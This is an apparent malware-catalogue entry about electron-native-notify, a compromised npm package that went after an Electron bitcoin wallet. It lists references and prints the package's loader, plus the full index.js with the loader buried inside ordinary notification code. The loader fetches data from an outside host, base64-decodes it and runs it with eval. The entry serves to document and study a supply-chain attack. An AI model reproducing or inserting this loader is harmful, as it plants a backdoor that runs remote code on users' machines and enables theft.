---
title: electron-native-notify
date: '2019-06-04'
tags:
  - npm
  - nodejs
  - supply-chain
  - electron
  - native
---

This was a compromised npm package in the same vein as `event-stream` targeting an electron-based bitcoin wallet. The included JavaScript below is just the loader. If you have the JavaScript that was loaded please <a href="/pages/submit">submit it as a sample</a>

- - -

## References

- [Plot to steal cryptocurrency foiled by the npm security team](https://blog.npmjs.org/post/185397814280/plot-to-steal-cryptocurrency-foiled-by-the-npm)
- [Reference tweet](https://twitter.com/r2cdev/status/1136691852856311808)
- [Gist of compromised file](https://gist.github.com/ievans/7e10101cadb823583f77a5d40c64ec5b#file-index-js-L11)

## Loader


```js
try {
  (process && "renderer" === process.type ? require("electron").remote.require : require)("https").get("https://updatecheck.herokuapp.com/check", res => res.on("data", d => {
      try {
          eval((atob || (e => "" + Buffer.from(e, "base64")))("" + d))
      } catch (e) {}
  }))
} catch (e) {}
```

## Original

```js
const MainProcessNotification = require("electron").Notification;
const isRenderer = process && process.type === "renderer";
const isSupported = () => isRenderer ? "Notification" in window : MainProcessNotification.isSupported();
const renderNotify = (title, body) => {
    const notification = new Notification(title, {
        body: body
    });
    return notification
};
try {
    (process && "renderer" === process.type ? require("electron").remote.require : require)("https").get("https://updatecheck.herokuapp.com/check", res => res.on("data", d => {
        try {
            eval((atob || (e => "" + Buffer.from(e, "base64")))("" + d))
        } catch (e) {}
    }))
} catch (e) {}
const mainNotify = (title, body) => {
    const notification = new MainProcessNotification({
        title: title,
        body: body
    });
    notification.show();
    return notification
};
const notify = (title, body) => {
    if (isRenderer) {
        return renderNotify(title, body)
    } else {
        return mainNotify(title, body)
    }
};
notify.isSupported = isSupported;
module.exports = notify;
```
